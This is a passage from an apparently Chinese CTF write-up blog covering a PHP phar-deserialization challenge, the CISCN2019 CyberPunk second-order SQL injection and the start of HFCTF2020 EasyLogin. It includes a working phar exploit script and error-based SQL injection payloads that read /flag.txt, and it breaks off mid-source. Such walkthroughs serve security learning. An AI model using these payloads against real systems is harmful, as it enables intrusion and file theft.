class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先找反序列化链子吧</p><blockquote><p>会发现在File类中有一个close()函数，这里还直接调用file_get_comtents()函数,那么不多说这里绝对是链子的结尾。但是如果只用这两个类是不够的，因为不能直接打印出来。所以得继续下一个类FileList继续使用，正好里面也有__call函数。func是调用的方法名，args是方法的参数<br> <br>那么我们就将$this-&gt;db复制为FileList类这样我们就可以直接使用该类中得方法。</p></blockquote><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&#x2F;&#x2F;exp.php&lt;?phpclass User&#123;    public $db;    public function __construct()     &#123;        $this-&gt;db &#x3D; new FileList();    &#125;&#125;class File&#123;    public $filename;&#125;class FileList &#123;    private $files;    public function __construct()     &#123;        $file &#x3D; new File();        $file-&gt;filename &#x3D; &#39;&#x2F;flag.txt&#39;;        $this-&gt;files &#x3D; array($file);    &#125;&#125;$User &#x3D; new User();$phar &#x3D; new Phar(&quot;.&#x2F;rabbit.phar&quot;); &#x2F;&#x2F;.phar文件$phar-&gt;startBuffering();$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;);$phar-&gt;setMetadata($User); &#x2F;&#x2F;触发的头是User类，所以传入User对象$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;生成签名$phar-&gt;stopBuffering();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在delete页面传入phar://文件名即可</p>        <h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"   >          <a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="heading-link"><i class="fas fa-link"></i></a><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2>      <p>看源码得到提示<code>&lt;!--?file=?--&gt;</code>伪协议读代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//confirm.phpif(!empty($_POST["user_name"]) &amp;&amp; !empty($_POST["address"]) &amp;&amp; !empty($_POST["phone"]))&#123;    $msg = '';    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';    $user_name = $_POST["user_name"];    $address = $_POST["address"];    $phone = $_POST["phone"];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;        $msg = 'no sql inject!';    &#125;else&#123;        $sql = "select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'";        $fetch = $db->query($sql);    &#125;    if($fetch->num_rows>0) &#123;        $msg = $user_name."已提交订单";    &#125;else&#123;        $sql = "insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)";        $re = $db->prepare($sql);        $re->bind_param("sss", $user_name, $address, $phone);        $re = $re->execute();//change.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'no sql inject!'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from `user` where `user_name`='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$user_name</span><span class="token punctuation">&#125;</span></span>' and `phone`='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$phone</span><span class="token punctuation">&#125;</span></span>'"</span><span class="token punctuation">;</span>        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"update `user` set `address`='"</span><span class="token operator">.</span><span class="token variable">$address</span><span class="token operator">.</span><span class="token string double-quoted-string">"', `old_address`='"</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'address'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"' where `user_id`="</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'error'</span><span class="token punctuation">;</span>            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">exit</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"订单修改成功"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"未找到订单!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"信息不全"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关键在于confirm中没有对传入的address进行过滤，而在change中又对查询出的旧address进行了使用，所以我们在更改地址的时候就会触发我们在confirm中提交的payload</p><pre class="line-numbers language-none"><code class="language-none">1&#39; where phone&#x3D;updatexml(1,concat(0x7e,(select database()),0x7e),1)#1&#39; where phone&#x3D;updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1)#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查完库和表发现好像不是在数据库内，load_file看看文件</p><pre class="line-numbers language-none"><code class="language-none">1&#39; where phone&#x3D;updatexml(1,concat(0x7e,(select load_file(&#39;&#x2F;flag.txt&#39;)),0x7e),1)#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p>        <h2 id="HFCTF2020-EasyLogin"   >          <a href="#HFCTF2020-EasyLogin" class="heading-link"><i class="fas fa-link"></i></a><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2>      <p>注册登录后点击<code>GET FLAG</code>显示权限不足，查看返回内容发现jwt</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-08" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-08</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 21.14.12.png)</p><p>下一步不知道咋走了，看wp是要分析源码</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//app.js</span><span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> username <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#username"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> password <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#password"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> token <span class="token operator">=</span> sessionStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    $<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/api/login"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> <span class="token literal-property property">authorization</span><span class="token operator">:</span>token<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>status<span class="token punctuation">&#125;</span> <span class="token operator">=</span> data<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                document<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"/home"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">fail</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">xhr<span class="token punctuation">,</span> textStatus<span class="token punctuation">,</span> errorThrown</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">alert</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseJSON<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> username <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#username"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> password <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#password"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    $<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/api/register"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> password<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> token <span class="token punctuation">&#125;</span> <span class="token operator">=</span> data<span class="token punctuation">;</span>            sessionStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">;</span>            document<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"/login"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">fail</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">xhr<span class="token punctuation">,</span> textStatus<span class="token punctuation">,</span> errorThrown</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">alert</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseJSON<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/api/logout'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>status<span class="token punctuation">&#125;</span> <span class="token operator">=</span> data<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            document<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'/login'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/api/flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span> <span class="token operator">=</span> data<span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#username"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fail</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">xhr<span class="token punctuation">,</span> textStatus<span class="token punctuation">,</span> errorThrown</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseJSON<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里贴一张js代码结构图</p><p><img   src="https://img-blog.csdnimg.cn/7b8b17a37cf94567bbc21edc080ab07b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAc3VjYzM=,size_20,color_FFFFFF,t_70,g_se,x_16" style="width: image/watermark,type_d3F5LXplbmhlaQ,shadow_50,tepx;height: t_Q1NETiBAc3VjYzMpx;" ></p><p>看看controllers中的app.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//controllers/app.js</span><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jsonwebtoken'</span><span class="token punctuation">)</span><span class="token keyword">const</span> APIError <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../rest'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>APIError<span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string-property property">'POST /api/register'</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> password<span class="token punctuation">&#125;</span> <span class="token operator">=</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> username <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'register error'</span><span class="token punctuation">,</span> <span class="token string">'wrong username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">100000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            global<span class="token punctuation">.</span>secrets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> secret <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> secretid <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span>        <span class="token keyword">const</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>secretid<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">'HS256'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">token</span><span class="token operator">:</span> token        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string-property property">'POST /api/login'</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> password<span class="token punctuation">&#125;</span> <span class="token operator">=</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> <span class="token operator">!</span>password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'login error'</span><span class="token punctuation">,</span> <span class="token string">'username or password is necessary'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> token <span class="token operator">=</span> ctx<span class="token punctuation">.</span>header<span class="token punctuation">.</span>authorization <span class="token operator">||</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">.</span>authorization <span class="token operator">||</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>authorization<span class="token punctuation">;</span>        <span class="token keyword">const</span> sid <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>secretid<span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>sid<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>sid <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> sid <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token punctuation">(</span>sid <span class="token operator">&lt;</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> sid <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'login error'</span><span class="token punctuation">,</span> <span class="token string">'no such secret id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> secret <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">[</span>sid<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> user <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">'HS256'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> status <span class="token operator">=</span> username <span class="token operator">===</span> user<span class="token punctuation">.</span>username <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> user<span class="token punctuation">.</span>password<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            status        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string-property property">'GET /api/flag'</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'permission error'</span><span class="token punctuation">,</span> <span class="token string">'permission denied'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> flag <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            flag        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string-property property">'GET /api/logout'</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span 